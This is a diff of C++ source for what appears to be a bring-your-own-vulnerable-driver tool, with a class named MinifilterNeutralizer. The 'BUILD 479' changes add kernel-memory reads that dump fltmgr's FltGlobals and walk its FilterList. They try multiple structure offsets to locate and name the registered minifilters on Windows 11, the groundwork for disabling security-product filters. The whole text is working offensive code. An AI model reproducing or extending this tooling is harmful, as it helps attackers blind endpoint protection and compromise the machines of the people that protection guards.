@@ -3818,8 +3818,32 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     ByovdDiag("FLT:VERIFY: PASS — FilterList at FltGlobals[%d]+0x%llX\n",
         frameQi, filterListHead - globQw[frameQi]);
 
+    // ★ BUILD 479: dump FltGlobals raw + Frame candidates for Win11 layout analysis
+    ByovdDiag("FLT:VERIFY: FltGlobals hex (8 qwords):\n");
+    for (int i = 0; i < 8; i++) {
+        ByovdDiag("FLT:VERIFY:   [%d] %016llX\n", i, (unsigned long long)globQw[i]);
+    }
+
+    // ★ BUILD 479: dump 每个 Frame 候选 (globQw 中在 fltmgr 范围内的有效指针)
+    //   用于确认 FilterList 是否在正确的 FLTP_FRAME 中
+    for (int qi = 0; qi < 8; qi++) {
+        uint64_t cf = globQw[qi];
+        if (cf < 0xFFFF800000000000ULL) continue;
+        if (cf < fltmgrBase || cf >= fltmgrBase + imageSize) continue;
+        ByovdDiag("FLT:VERIFY: Frame[%d] at fltmgr+0x%llX dump:\n",
+            qi, (unsigned long long)(cf - fltmgrBase));
+        for (int j = 0; j < 8; j++) {
+            uint64_t qw = 0;
+            kma.ReadKernelVA(cf + j * 8, &qw, 8);
+            ByovdDiag("FLT:VERIFY:   +0x%03llX: %016llX\n", (unsigned long long)(j * 8), (unsigned long long)qw);
+        }
+    }
+
     // === Check 4: Enumerate filters in FilterList ===
     ByovdDiag("FLT:VERIFY: [4/%d] Enumerating filters in FilterList...\n", checksTotal);
+
+    // ★ BUILD 479: 尝试多种 ActiveLink 偏移 (Win11 FLT_OBJECT 可能更大)
+    uint64_t activeLinkOffsets[] = { 0x008, 0x010, 0x018, 0x020, 0x028, 0x030 };
 
     uint64_t nameOffsets[] = {
         0x038, 0x040, 0x048, 0x058, 0x068, 0x078,
@@ -3837,61 +3861,52 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     uint64_t current = 0;
     if (kma.ReadKernelVA(filterListHead, &current, sizeof(current))) {
         for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
-            uint64_t filterBase = current - 0x008;
+            bool foundForAnyOffset = false;
 
-            bool found = false;
-            for (uint64_t nameOff : nameOffsets) {
-                uint16_t nameLen = 0;
-                uint64_t nameBuf = 0;
-                uint64_t uniAddr = filterBase + nameOff;
+            // ★ BUILD 479: 尝试多种 filterBase 偏移 (ActiveLink 不一定在 +0x008)
+            for (uint64_t activeOff : activeLinkOffsets) {
+                uint64_t filterBase = current - activeOff;
+                if (filterBase < 0xFFFF800000000000ULL) continue;
 
-                if (kma.ReadKernelVA(uniAddr, &nameLen, sizeof(nameLen)) &&
-                    kma.ReadKernelVA(uniAddr + 8, &nameBuf, sizeof(nameBuf))) {
+                for (uint64_t nameOff : nameOffsets) {
+                    uint16_t nameLen = 0;
+                    uint64_t nameBuf = 0;
+                    uint64_t uniAddr = filterBase + nameOff;
 
-                    if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
-                        nameBuf > 0xFFFF800000000000ULL) {
+                    if (kma.ReadKernelVA(uniAddr, &nameLen, sizeof(nameLen)) &&
+                        kma.ReadKernelVA(uniAddr + 8, &nameBuf, sizeof(nameBuf))) {
 
-                        std::wstring filterName = ReadKernelUnicodeString(nameBuf, nameLen);
-                        ByovdDiag("FLT:VERIFY:   [%d] '%ls' at 0x%llX (nameOff=0x%llX)\n",
-                            filterCount, filterName.c_str(),
-                            (unsigned long long)filterBase, nameOff);
-                        filterCount++;
-                        found = true;
-                        break;
-                    }
-                }
-            }
+                        if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
+                            nameBuf > 0xFFFF800000000000ULL) {
 
-            if (!found) {
-                // ★ BUILD 477: dump unnamed filter 前 64 qword (0x000-0x1F8)
-                //   + 扫描所有偏移报告 UNICODE_STRING 候选位置
-                ByovdDiag("FLT:VERIFY:   [%d] (unnamed) at 0x%llX:\n",
-                    filterCount, (unsigned long long)filterBase);
-                for (int q = 0; q < 64; q++) {
-                    uint64_t qw = 0;
-                    uint64_t dumpAddr = filterBase + q * 8;
-                    kma.ReadKernelVA(dumpAddr, &qw, sizeof(qw));
-                    // 每 8 个 qword 换行
-                    if (q % 4 == 0) ByovdDiag("FLT:VERIFY:     +0x%03llX:", (unsigned long long)(q * 8));
-                    ByovdDiag(" %016llX", (unsigned long long)qw);
-                    if (q % 4 == 3) ByovdDiag("\n");
-                    // 检测 UNICODE_STRING: 前2字节(Length) 非零且≤256且偶数, 后2字节(MaxLen)非零, ptr是内核地址
-                    uint16_t usLen  = (uint16_t)(qw & 0xFFFF);
-                    uint16_t usMax  = (uint16_t)((qw >> 16) & 0xFFFF);
-                    bool isUniStr = (usLen > 0 && usLen <= 256 && usLen % 2 == 0 && usMax > 0);
-                    if (isUniStr) {
-                        // 读取 +8 的 Buffer 指针 (从下一个 qword)
-                        if (q + 1 < 64) {
-                            uint64_t nxtQw = 0;
-                            kma.ReadKernelVA(dumpAddr + 8, &nxtQw, sizeof(nxtQw));
-                            if (nxtQw > 0xFFFF800000000000ULL) {
-                                ByovdDiag("FLT:VERIFY:       ^^^ offset +0x%03llX MAY BE Name: Len=%u Max=%u Buf=0x%llX\n",
-                                    (unsigned long long)(q * 8), usLen, usMax, (unsigned long long)nxtQw);
-                            }
+                            std::wstring filterName = ReadKernelUnicodeString(nameBuf, nameLen);
+                            ByovdDiag("FLT:VERIFY:   [%d] '%ls' at 0x%llX (activeOff=0x%llX nameOff=0x%llX)\n",
+                                filterCount, filterName.c_str(),
+                                (unsigned long long)filterBase, activeOff, nameOff);
+                            filterCount++;
+                            anyNamed = true;
+                            foundForAnyOffset = true;
+                            break;
                         }
                     }
                 }
-                if (64 % 4 != 0) ByovdDiag("\n");
+                if (foundForAnyOffset) break;
+            }
+
+            if (!foundForAnyOffset) {
+                // ★ 用默认 filterBase (current - 0x008) dump, 但也报告其他偏移尝试结果
+                uint64_t defBase = current - 0x008;
+                ByovdDiag("FLT:VERIFY:   [%d] (unnamed, base=0x%llX):\n",
+                    filterCount, (unsigned long long)defBase);
+                // 只 dump 默认偏移的前 16 qword (减少日志量)
+                for (int q = 0; q < 16; q++) {
+                    uint64_t qw = 0;
+                    kma.ReadKernelVA(defBase + q * 8, &qw, sizeof(qw));
+                    if (q % 4 == 0) ByovdDiag("FLT:VERIFY:     +0x%03llX:", (unsigned long long)(q * 8));
+                    ByovdDiag(" %016llX", (unsigned long long)qw);
+                    if (q % 4 == 3) ByovdDiag("\n");
+                }
+                if (16 % 4 != 0) ByovdDiag("\n");
                 filterCount++;
             }
 
